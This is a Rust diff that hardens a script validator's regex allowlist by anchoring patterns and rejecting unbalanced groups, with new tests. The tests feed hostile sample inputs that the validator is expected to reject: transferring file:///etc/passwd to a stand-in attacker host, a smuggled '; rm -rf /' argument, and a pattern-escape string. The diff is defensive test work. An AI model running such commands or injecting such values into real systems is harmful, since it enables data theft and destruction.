@@ -356,7 +356,13 @@ impl ScriptValidator {
     fn match_str(source: &str, pattern: &str, method: ArgMatch) -> bool {
         match method {
             ArgMatch::Strict => source == pattern,
-            ArgMatch::Regex => match regex::Regex::new(pattern) {
+            // Anchor the pattern so that it has to match the whole string,
+            // not just a substring of it. The pattern is validated on its own
+            // first, so that unbalanced groups (e.g. `a)|(.*`) cannot escape
+            // the anchoring group.
+            ArgMatch::Regex => match regex::Regex::new(pattern)
+                .and_then(|_| regex::Regex::new(&format!("^(?:{})$", pattern)))
+            {
                 Ok(re) => re.is_match(source),
                 _ => false,
             },
@@ -811,5 +817,132 @@ mod tests {
         .parse()
         .unwrap();
         validator.validate(&commands).unwrap();
+    }
+
+    #[test]
+    fn script_regex_must_match_whole_string() {
+        let transfer = |from: &str, to: &str| {
+            vec![ExeScriptCommand::Transfer {
+                from: from.to_string(),
+                to: to.to_string(),
+                args: Default::default(),
+                progress: None,
+            }]
+        };
+
+        let validator: ScriptValidator = r#"{
+            "commands": [ "transfer http://.*" ],
+            "match": "regex"
+        }"#
+        .parse()
+        .unwrap();
+        assert!(validator
+            .validate(&transfer(
+                "file:///etc/passwd",
+                "http://attacker.example/upload"
+            ))
+            .is_err());
+        validator
+            .validate(&transfer("http://example.com/in", "/dst/in"))
+            .unwrap();
+
+        let validator: ScriptValidator = r#"{
+            "commands": [ "transfer /src/a /dst/a" ],
+            "match": "regex"
+        }"#
+        .parse()
+        .unwrap();
+        validator.validate(&transfer("/src/a", "/dst/a")).unwrap();
+        assert!(validator.validate(&transfer("/src/a", "/dst/ab")).is_err());
+        assert!(validator.validate(&transfer("/x/src/a", "/dst/a")).is_err());
+
+        let validator: ScriptValidator = r#"{
+            "commands": ["{\"transfer\": { \"from\": \"http://.*\", \"to\": \"/dst/a\" } }"],
+            "match": "regex"
+        }"#
+        .parse()
+        .unwrap();
+        validator
+            .validate(&transfer("http://example.com/a", "/dst/a"))
+            .unwrap();
+        assert!(validator
+            .validate(&transfer("file:///etc/passwd", "http://x/ /dst/a"))
+            .is_err());
+
+        let run = |entry_point: &str, args: &[&str]| {
+            vec![ExeScriptCommand::Run {
+                entry_point: entry_point.to_string(),
+                args: args.iter().map(|a| a.to_string()).collect(),
+                capture: None,
+            }]
+        };
+
+        let validator: ScriptValidator = r#"{
+            "commands": [ "run /bin/date -R" ],
+            "match": "regex"
+        }"#
+        .parse()
+        .unwrap();
+        validator.validate(&run("/bin/date", &["-R"])).unwrap();
+        assert!(validator
+            .validate(&run("/bin/date", &["-R", "; rm -rf /"]))
+            .is_err());
+        assert!(validator
+            .validate(&run("/bin/sh", &["-c", "x", "/bin/date", "-R"]))
+            .is_err());
+    }
+
+    #[test]
+    fn script_regex_alternation_is_anchored() {
+        let transfer = |from: &str, to: &str| {
+            vec![ExeScriptCommand::Transfer {
+                from: from.to_string(),
+                to: to.to_string(),
+                args: Default::default(),
+                progress: None,
+            }]
+        };
+
+        let validator: ScriptValidator = r#"{
+            "commands": [ "transfer /src/a /dst/a|transfer /src/b /dst/b" ],
+            "match": "regex"
+        }"#
+        .parse()
+        .unwrap();
+        validator.validate(&transfer("/src/a", "/dst/a")).unwrap();
+        validator.validate(&transfer("/src/b", "/dst/b")).unwrap();
+        // Without grouping, `^a|b$` would accept a string starting with `a`
+        // or ending with `b`.
+        assert!(validator
+            .validate(&transfer("/src/a", "/dst/a http://attacker"))
+            .is_err());
+        assert!(validator
+            .validate(&transfer("file:///etc/passwd", "x transfer /src/b /dst/b"))
+            .is_err());
+
+        // Leftmost-first alternation where the first branch is a prefix of the
+        // second one must still accept a full match on the second branch.
+        let validator: ScriptValidator = r#"{
+            "commands": [ "transfer /src/a /dst/(a|ab)" ],
+            "match": "regex"
+        }"#
+        .parse()
+        .unwrap();
+        validator.validate(&transfer("/src/a", "/dst/a")).unwrap();
+        validator.validate(&transfer("/src/a", "/dst/ab")).unwrap();
+        assert!(validator.validate(&transfer("/src/a", "/dst/abc")).is_err());
+
+        // An invalid pattern must not become valid by being wrapped in the
+        // anchoring group.
+        let validator: ScriptValidator = r#"{
+            "commands": [ "transfer /src/a /dst/a)|(.*" ],
+            "match": "regex"
+        }"#
+        .parse()
+        .unwrap();
+        assert!(validator.validate(&transfer("/src/a", "/dst/a")).is_err());
+        assert!(validator
+            .validate(&transfer("file:///etc/passwd", "http://attacker"))
+            .is_err());
     }
 }
